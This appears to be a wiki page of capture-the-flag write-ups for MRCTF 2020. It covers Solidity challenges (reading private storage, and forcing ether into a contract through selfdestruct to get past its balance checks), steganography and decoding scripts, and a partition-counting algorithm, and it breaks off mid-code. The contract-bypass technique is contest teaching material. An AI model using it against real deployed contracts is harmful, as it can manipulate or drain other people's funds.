



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.5.0">
    
    
      
        <title>MRCTF新生赛 2020 - Merak Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#mrctf-2020" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../.." title="Merak Wiki" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Merak Wiki
            </span>
            <span class="md-header-nav__topic">
              
                MRCTF新生赛 2020
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  <li class="md-tabs__item">
    
      <a href="../.." class="md-tabs__link">
        Merak Wiki
      </a>
    
  </li>

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../knowledge/crypto/古典加密/" class="md-tabs__link">
          Knowledge
        </a>
      
    </li>
  

  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="./" class="md-tabs__link md-tabs__link--active">
          Writeup
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../.." title="Merak Wiki" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Merak Wiki
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Merak Wiki" class="md-nav__link">
      Merak Wiki
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Knowledge
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Knowledge
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1">
    
    <label class="md-nav__link" for="nav-2-1">
      Crypto
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-1">
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../knowledge/crypto/古典加密/" title="古典加密" class="md-nav__link">
      古典加密
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
    
    <label class="md-nav__link" for="nav-2-2">
      Misc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-2">
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../knowledge/misc/流量分析/" title="流量分析" class="md-nav__link">
      流量分析
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../knowledge/pwn/overflow/" title="Overflow" class="md-nav__link">
      Overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4">
    
    <label class="md-nav__link" for="nav-2-4">
      Re
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-4">
        Re
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../knowledge/re/SMC/" title="SMC" class="md-nav__link">
      SMC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      Web
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../knowledge/web/awd_web/" title="Awd web" class="md-nav__link">
      Awd web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../knowledge/web/injection/" title="Injection" class="md-nav__link">
      Injection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
    
    <label class="md-nav__link" for="nav-3">
      Writeup
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Writeup
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        MRCTF新生赛 2020
      </label>
    
    <a href="./" title="MRCTF新生赛 2020" class="md-nav__link md-nav__link--active">
      MRCTF新生赛 2020
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#blockchains" class="md-nav__link">
    Blockchains
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#simplereveal" class="md-nav__link">
    SimpleReveal
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unwanted-coin" class="md-nav__link">
    Unwanted Coin
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    Misc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hellomisc_world" class="md-nav__link">
    Hello，misc_world！
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../NJUPT-2019/" title="NJUPT CTF 天璇Writeup" class="md-nav__link">
      NJUPT CTF 天璇Writeup
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#blockchains" class="md-nav__link">
    Blockchains
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#simplereveal" class="md-nav__link">
    SimpleReveal
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unwanted-coin" class="md-nav__link">
    Unwanted Coin
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    Misc
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hellomisc_world" class="md-nav__link">
    Hello，misc_world！
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="mrctf-2020">MRCTF新生赛 2020</h1>
<h2 id="blockchains">Blockchains</h2>
<h3 id="simplereveal">SimpleReveal</h3>
<p>本题主要考察对 solidity 和 web3 的应用。
解法一</p>
<pre><code>pragma solidity&gt;=0.4.22;

contract reveal {

    private string flag=&quot;some_string_here&quot;;

}
</code></pre>

<blockquote>
<p>根据原合约，可以看到 flag 应该在合约的前几个变量槽中，因此可以通过 web3.eth.getStorageAt("合约地址", 0) 获取存储的变量，从而解码得到flag。</p>
</blockquote>
<p>解法二</p>
<p>Etherscan 上可以看到创建合约信息，其中可以看到 flag 。</p>
<h3 id="unwanted-coin">Unwanted Coin</h3>
<p>pragma solidity &gt;=0.6.1;</p>
<p>contract Modcoin {</p>
<pre><code>mapping(uint256 =&gt; bool) public is_successful;

function recvpay() public payable {

    require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), "Not Accepting These Coins.");

}

function getflag(uint256 target) public {

    require((address(this).balance / 0.001 ether ) % 2 == 1,"Not Wanted value");

    require(msg.sender.send(address(this).balance));

    is_successful[target] = true;

}

fallback () external payable {

    require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), "Not Accepting These Coins.");

}
</code></pre>
<p>}</p>
<p>原合约中两个支付函数 recvpay() 和 fallback() 都只允许接受偶数倍0.001 ether的付款，而合约的getflag函数则要求奇数倍 0.001 ether 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。</p>
<p>contract Payassist {</p>
<pre><code>function destroy_pay(address payable addr) public payable {

    selfdestruct(addr);

}
</code></pre>
<p>}</p>
<h2 id="misc">Misc</h2>
<h3 id="hellomisc_world">Hello，misc_world！</h3>
<blockquote>
<p>附件链接：https://pan.baidu.com/s/1kNc2oD5AkfJuzuCPL_qY5w</p>
<p>提取码：m4ly</p>
</blockquote>
<p>下载附件得到一张红蓝图和一个加密的rar包，binwalk分离图片可以得到一个加密的zip包
+ 第一种解法（其实是俺的预期解，但是师傅们给了更简单的解法，可见解法二）</p>
<p>根据图片所给名称，可以判断图中隐藏了信息，由于图片中只有红色和蓝色，故可以想到将图片中的红色和蓝色像素块转换成 <code>0 &amp; 1</code> 序列并重新构建，以此可以还原得到一张图片：</p>
<blockquote>
<p>生成脚本：</p>
<p>```python
from PIL import Image
import bitstring</p>
<p>with open('1.png','rb') as f:
  bitcon = bitstring.Bits(f)
  im = Image.new('RGB',(1024,780),(255,0,0))
  pim = im.load()
  for i,val in enumerate(bitcon.bin):
      if val == '0':
          pim[i%1024,i/1024] = (0,0,255)
  im.save('red_blue.png')
```</p>
<p>解题脚本：</p>
<p>```python
from PIL import Image
import bitstring</p>
<p>im = Image.open('try to restore it.png')
width = im.size[0]
height = im.size[1]
pim = im.load() # 读取图片的像素信息
bin_result = ''
for h in range(height):
  for w in range(width):
      if pim[w,h][0] == 255: # 判断是否是红色（R,G,B）[0]表示第一通道
          bin_result += '1'
      else:
          bin_result += '0'</p>
<h1 id="print-bitstringbitarraybinbin_resultbytesencodehex">print bitstring.BitArray(bin=bin_result).bytes.encode('hex')</h1>
<p>with open('result.png','wb') as f:
  f.write(bitstring.BitArray(bin=bin_result).bytes)
```</p>
<p><em>注：由于刚开始无法确定长宽的内外循环关系及红蓝对应关系，故可以进行多次尝试</em></p>
</blockquote>
<p>还原得到图片，看图获得解压zip包的密码：</p>
<p><img alt="GifRPO.png" src="https://s1.ax1x.com/2020/03/27/GifRPO.png" />
+ 第二种解法</p>
<p>用<code>stegsolve</code>查看图片，<code>Save Bin</code>可直接得到图片：</p>
<p><img alt="GZhFyT.png" src="https://s1.ax1x.com/2020/03/29/GZhFyT.png" /></p>
<p>解开压缩包后得到一个文档，文档中信息：</p>
<pre><code class="python">127
255
63
191
127
191
63
127
127
255
63
191
63
191
255
127
...
</code></pre>

<p>观察可知文档中只含有 <strong>127 255 63 191</strong> 这四个数字，将这四个数字转化为二进制，可以看到这四个数字的二进制形式中 <strong>只有最高两位的二进制数不同</strong> ，将其最高两位提取出来组合在一起转化为ASCII，可以得到rar密码：</p>
<pre><code class="python">fp = open('out.txt','r')
a = fp.readlines()
p = []
for i in a:
 p.append(int(i))

s = ''
for i in p:
 if i == 63:
     a = '00'
 elif i == 127:
     a = '01'
 elif i == 191:
     a = '10'
 elif i == 255:
     a = '11'
 s += a

import binascii

result = ''
for i in range(0,len(s),8):
 result += chr(int(s[i:i+8],2))

print result
</code></pre>

<p>得到rar包的解压密码：<strong>0ac1fe6b77be5dbe</strong></p>
<p>解压可以得到一个zip包，看zip包里的内容可以知道这是一个 <strong>docx</strong> 文件，改后缀为docx得到最终的文件</p>
<p>将文件内容全选改为深色，可以看到在文档的最下方藏有几串字符</p>
<p><img alt="GifOJS.png" src="https://s1.ax1x.com/2020/03/27/GifOJS.png" /></p>
<blockquote>
<p>ps：如果用word打开的话可以看到有最后的换行符存在，可以判断文档中隐藏了内容</p>
</blockquote>
<p>将每一长串的字符用base64解码，可以得到6行只由 <code>0 &amp; 1</code> 组成的字符串</p>
<p>在文档左侧（word和WPS都可）查找字符就可以观察到flag，包裹上 <code>MRCTF{}</code> 就是最终的flag</p>
<p><img alt="GihFiT.png" src="https://s1.ax1x.com/2020/03/27/GihFiT.png" /></p>
<pre><code class="python">flag: MRCTF{He1Lo_mi5c~}
</code></pre>

<h3 id="iss">ISS</h3>
<p>SSTV慢扫描电视。
无线电，直接用MMSSTV就能解码了。
读出图片取得flag。</p>
<h3 id="_1">不眠之夜</h3>
<p>这是一个不能透露出题人信息的题目...
解法1：手动拼图（逃
解法2：写脚本拼图。通过一些方法（比如边缘的对应像素色差取平方和）计算边缘的相似度，对每个图片对象dfs其四周最相似的图片即可，复杂度(n^3)，2000多像素，常数不大，可以跑。
在使用PIL拼图的时候注意生成原图长宽二倍的图片，从中间一点开始扩展，可以保证不会越界。或者检测红色像素点位置，据此构造边缘特征也可以，但这样容易出现多个强连通分量的情况，最后还要手动拼
（算法dalao请务必把脚本发来看看
解法3：gayhub上的gaps工具。谷歌搜索jigsaw solver可以找到这个工具，两秒就跑出来了。
注意其参数<code>-size</code>代表了分割成正方形块的边长。显然应该取小拼图的长宽最大公因数100
<img alt="" src="https://ww1.yunjiexi.club/2020/03/28/mukAD.gif" /></p>
<h3 id="unravel">Unravel</h3>
<p>首先拿到后binwalk分离图片发现带有aes的Tokyo
然后查看.wav文件尾，发现密文。
利用密码解密的得到另一个.wav
通过silenteye解LSB隐写
得到flag。</p>
<h3 id="_2">飞来横财</h3>
<pre><code class="solidity">pragma solidity &gt;=0.6.1;

contract Modcoin {
    mapping(uint256 =&gt; bool) public is_successful;
    function recvpay() public payable {
        require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;);
    }
    function getflag(uint256 target) public {
        require((address(this).balance / 0.001 ether ) % 2 == 1,&quot;Not Wanted value&quot;);
        require(msg.sender.send(address(this).balance));
        is_successful[target] = true;
    }
    fallback () external payable {
        require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;);
    }
}

</code></pre>

<p>原合约中两个支付函数<code>recvpay()</code> 和 <code>fallback()</code> 都只允许接受偶数倍<code>0.001 ether</code>的付款，而合约的<code>getflag</code>函数则要求奇数倍 <code>0.001 ether</code> 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。</p>
<pre><code class="solidity">contract Payassist {
    function destroy_pay(address payable addr) public payable {
        selfdestruct(addr);
    }
}
</code></pre>

<h3 id="pyflag">pyflag</h3>
<p>题目灵感：出题人感觉Misc很多题目有着相同的套路，想要尝试基于特征的隐写自动解决工具...于是就有了题目的最后一部分</p>
<p>拿到题目解压缩后发现三张图片。无论是使用strings命令，还是用16进制编辑器打开图片，都可以发现文件末尾隐藏了一些信息。strings会发现[Secret File Part 1-3]的标识，而16进制打开则发现文件尾的结束符并非jpg的标准结束符<code>FF D9</code>。</p>
<p><img alt="" src="https://ww1.yunjiexi.club/2020/03/12/cliQk.md.png" /></p>
<p>于是将这三段隐藏信息复制到16进制编辑器中，可以得到一个压缩包。
压缩包密码是弱密码1234</p>
<p>然后取得了一个flag.txt，.hint已经提示了使用base16,32,64,85的编码，可以编写自动化脚本来处理，也可以手动尝试。只加密了五层，手动尝试不会很耗费时间。编写py脚本这就需要正则表达式的知识，并掌握这些编码的正则特征。
如果你选择编写脚本解码，那么请注意使用的函数传入的参数是str（"Astring"）还是bytes(b"Astring")。字符流和字节流的区别也很重要，可以去了解一下，明确它们的区别可以让你在数据处理时更加熟练。</p>
<pre><code class="python">#!/usr/bin/env python

import base64
import re

def baseDec(text,type):
    if type == 1:
        return base64.b16decode(text)
    elif type == 2:
        return base64.b32decode(text)
    elif type == 3:
        return base64.b64decode(text)
    elif type == 4:
        return base64.b85decode(text)
    else:
        pass

def detect(text):
    try:
        if re.match(&quot;^[0-9A-F=]+$&quot;,text.decode()) is not None:
            return 1
    except:
        pass

    try:
        if re.match(&quot;^[A-Z2-7=]+$&quot;,text.decode()) is not None:
            return 2
    except:
        pass

    try:
        if re.match(&quot;^[A-Za-z0-9+/=]+$&quot;,text.decode()) is not None:
            return 3
    except:
        pass

    return 4

def autoDec(text):
    while True:
        if b&quot;MRCTF{&quot; in text:
            print(&quot;\n&quot;+text.decode())
            break

        code = detect(text)
        text = baseDec(text,code)

with open(&quot;flag.txt&quot;,'rb') as f:
    flag = f.read()

autoDec(flag)
</code></pre>

<p>顺便给出我的加密脚本</p>
<pre><code class="python">#!/usr/bin/env python

import base64
import re

key = &quot;31214&quot;
# key本来非常长。。似乎太难了改的简单了点
# key = &quot;14332234124133132214311231&quot;
flag = b&quot;MRCTF{Y0u_Are_4_p3rFect_dec0der}&quot;

def baseEnc(text,type):
    if type == 1:
        return base64.b16encode(text)
    elif type == 2:
        return base64.b32encode(text)
    elif type == 3:
        return base64.b64encode(text)
    elif type == 4:
        return base64.b85encode(text)
    else:
        pass

def baseDec(text,type):
    if type == 1:
        return base64.b16decode(text)
    elif type == 2:
        return base64.b32decode(text)
    elif type == 3:
        return base64.b64decode(text)
    elif type == 4:
        return base64.b85decode(text)
    else:
        pass

def finalEnc(text,key):
    nf = text
    count = 1
    for i in key:
        nf = baseEnc(nf,int(i,10))
        #print(&quot;第&quot;+str(count)+&quot;次加密: &quot;,nf)
        count +=1

    return nf

def finalDec(text,key):
    nf = text
    key = key[::-1]
    print(key)
    count = 1
    for i in key:
        nf = baseDec(nf,int(i,10))
        #print(&quot;第&quot;+str(count)+&quot;次解密: &quot;,nf)
        count +=1

    return nf

def detect(text):

    try:
        if re.match(&quot;^[0-9A-F=]+$&quot;,text.decode()) is not None:
            return 1
    except:
        pass

    try:
        if re.match(&quot;^[A-Z2-7=]+$&quot;,text.decode()) is not None:
            return 2
    except:
        pass

    try:
        if re.match(&quot;^[A-Za-z0-9+/=]+$&quot;,text.decode()) is not None:
            return 3
    except:
        pass

    return 4

def autoDec(text):
    print(&quot;dec key:&quot;,end=&quot;&quot;)
    while True:
        if b&quot;MRCTF{&quot; in text:
            print(&quot;\n&quot;+text.decode())
            break
        code = detect(text)
        text = baseDec(text,code)
        print(str(code),end=&quot;&quot;)


fe = finalEnc(flag,key)
with open(&quot;flag.txt&quot;,'w') as f:
    f.write(fe.decode())
'''
ff = finalDec(fe,key)
print(ff)
'''
ff = autoDec(fe)
</code></pre>

<p>最后flag就是<code>MRCTF{Y0u_Are_4_p3rFect_dec0der}</code></p>
<h3 id="cyberpunk">cyberpunk!</h3>
<p>签到题。
改时间或者逆向都行。
但是昂哥加了个壳
估计大家都会去改时间吧23333。</p>
<h3 id="write-up">千层套路 Write Up</h3>
<p>主要考察python脚本编写能力</p>
<p>虽然是千层套娃但是为了不那么毒瘤其实只有两层</p>
<p>第一层，自动化解压zip</p>
<p>试几次就知道zip的解压密码都是对应名字，可以写脚本</p>
<pre><code class="python">#coding=utf-8
import os
import zipfile


orginal_zip = &quot;0573.zip&quot;

while True:
    tag = orginal_zip
    orginal_zip = zipfile.ZipFile(orginal_zip)
    for contents in orginal_zip.namelist():
        password = contents[0:contents.find('.')]
    print password
    orginal_zip.setpassword(tag[:-4])
    try:
        orginal_zip.extractall()
    except:
        break
    if(len(tag)&gt;6):
        os.system(&quot;rm &quot;+tag)
    orginal_zip=password+&quot;.zip&quot;
</code></pre>

<p>因为博客里有写过相应脚本，这里改了下，解压密码都是对应名字而不是压缩包里名字。有个可能的坑是如果不判断的话，程序跑完会自动把qr.zip也删了</p>
<p>然后第二层就是qr.txt</p>
<p>里面一堆</p>
<pre><code>(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
(255, 255, 255)
...
</code></pre>

<p>显然是像素点</p>
<p>用PIL库搞下</p>
<pre><code class="python">#coding=utf-8
from PIL import Image

x = 200    #x坐标  通过对txt里的行数进行整数分
y = 200    #y坐标  x * y = 行数

im = Image.new(&quot;RGB&quot;, (x, y))
file = open('qr.txt')

for i in range(0, x):
    for j in range(0, y):
        line = file.readline()  #获取一行的rgb值
        line = line[:-2]
        line = line[1:]
        print line
        rgb = line.split(&quot;, &quot;)  #分离rgb，文本中逗号后面有空格
        im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))

im.save('flag.png')
</code></pre>

<p>拿到二维码，扫一下拿到flag</p>
<pre><code>flag=&quot;MRCTF{ta01uyout1nreet1n0usandtimes}&quot;
</code></pre>

<h3 id="ezmisc"><strong>ezmisc</strong></h3>
<p>下载附件得到一张png图片，在windows下能打开看到，拖进kali中会显示CRC error，由此可以推断</p>
<p>图片的宽度/高度有问题，又因为图片宽度有问题时在windows下无法正常打开图片，所以本题为图片</p>
<p>高度有问题，修改图片高度即可看到flag：<code>MRCTF{1ts_vEryyyyyy_ez!}</code></p>
<p>附上有关CRC错误的隐写分析网址：https://www.bbsmax.com/A/gVdnlMVXJW/</p>
<p>ctfwiki中也有很详细的介绍：https://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/</p>
<h3 id="_3">你能看懂音符吗</h3>
<p>下载附件，解压时报错，放进winhex查看，发现rar文件头错误，将<code>6152</code>修改为<code>5261</code>后再解压，即</p>
<p>可得到一个word文档，打开后发现内容被隐藏，搜索word隐写可知其隐写方式，将被隐藏的内容显</p>
<p>示出来，得到一串音符，在线网址解密音符即可得到flag</p>
<p>word隐写方式（供参考）：https://blog.csdn.net/q_l_s/article/details/53813971</p>
<p>解密网址：https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</p>
<p>flag：<code>MRCTF{thEse_n0tes_ArE_am@zing~}</code></p>
<h2 id="algo">Algo</h2>
<h3 id="oi">致敬OI</h3>
<h4 id="description">Description</h4>
<p>萌新想要整理他的作战报告（经验）书。</p>
<p>萌新有$n$本经验书，分成了若干堆（含一堆），每堆经验书不少于$l$本且不超过$r$本。</p>
<p>萌新将所有数量相同的堆分为一类，并将堆数不少于$k$的类分别装箱存放。</p>
<p>所有经验书都是一样的。</p>
<p>萌新想知道，所有划分方案需要的箱子数的总和（对 65536 取模）。</p>
<p>每组询问包括四个整数 $n,k,l,r$。只要计算出萌新的所有询问，即可得到 flag。</p>
<h4 id="solution">Solution</h4>
<p>比赛前一天强行魔改了一道以前出的NOIP模拟赛题目。难度NOIP+省选-吧。</p>
<p>因为没有时限，数据范围改成了$10^8$，$O(n^{1.5})$大概跑半小时以内吧（最后几组数据跑一起算）。</p>
<p>记$n$有$p_n$种不同的划分，数字$i$出现至少$k$次的划分有$p_{n-ik}$个，一个划分正好会被每个至少出现了$k$次的数字计算一次，所以答案就是$$\sum_{i=l}^r p_{n-ik}$$</p>
<p>时间复杂度$\mathcal{O}(n(r-l))$。</p>
<p>当$l \geq \sqrt{n}$时，最多只会选$\sqrt{n}$个数。</p>
<p>$f_{i,j}$表示$j$划分为$i$个$l$至$r$间的数之和的方案数，有$$f_{i,j}=f_{i,j-i}+f_{i-1,j-l}-f_{i-1,j-i-r}$$</p>
<p>$f_{i,j-i}$表示将$i$件物品总体积为$j-i$的所有方案中的所有物品体积加一；</p>
<p>$f_{i-1,j-l}$表示将$i-1$件物品总体积为$j-l$的所有方案中加入一个体积为$l$的物品；</p>
<p>最后再减去出现了体积为$r+1$的物品的方案数，即$f_{i-1,j-i-r}$。</p>
<p>时间复杂度$\mathcal{O}(\frac{n^2}{l})$。</p>
<p>设置一个阈值$x$，$f_{i,j}$表示$j$划分为$i$个$x$至$r$间的数之和的方案数。</p>
<p>用完全背包求出${f_{0,n}}$，即$n$划分为数个$l$至$x-1$中数之和的方案数；再套用解法三即可。</p>
<p>时间复杂度$\mathcal{O}(n(x-l)+\frac{n^2}{x})$。
$x$取$\mathcal{O}(\sqrt{n})$时，时间复杂度最优，为$\mathcal{O}(n^{1.5})$。</p>
<pre><code class="cpp">#pragma GCC optimize(&quot;Ofast&quot;)
#include &lt;cmath&gt;
#include &lt;ctime&gt;
#include &lt;cctype&gt;
#include &lt;cstdio&gt;
#include &lt;cstring&gt;
#include &lt;algorithm&gt;

using namespace std;
typedef unsigned short ushort;

const int N = 1e8 + 10;
int n, l, r, x, mx;
ushort _[2][N], *f = _[0], *g = _[1], p[N];

void init(int n, int l, int r)
{
    auto t0 = time(0);
    ::n = n, ::l = l, ::r = r;
    x = min(r + 1, max(l, (int)sqrt(n)));
    mx = x &gt; r ? 0 : n / x;
    memset(_, 0, sizeof(_));
    memset(p, 0, sizeof(p));

    f[0] = 1;
    for (int i = l; i &lt; x; ++i)
    {
        auto t = time(0);
        double now = 1.0 * i / (x - l + mx);
        if (t - t0 &gt;= 10)
        {
            t0 = t;
            fprintf(stderr, &quot;%lf%c completed.\n&quot;, now * 100, '%');
        }
        for (int j = i; j &lt;= n; ++j)
        {
            f[j] += f[j - i];
